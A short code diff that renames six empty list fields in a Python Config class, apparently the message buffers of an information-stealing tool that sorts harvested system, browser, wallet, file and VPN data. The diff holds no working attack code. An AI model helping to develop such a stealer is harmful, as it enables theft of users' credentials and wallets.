@@ -15,9 +15,9 @@ class Config:
     name = ''
     password = ''
     np = []
-    dataForMassageSYS =[]
-    dataForMassageBrowsers =[]
-    dataForMassageOther =[]
-    dataForMassageWallets =[]
-    dataForMassageFiles = []
-    dataForMassageVPN = []
+    msgSys =[]
+    msgBrowsers =[]
+    msgOther =[]
+    msgWallets =[]
+    msgFiles = []
+    msgVPN = []
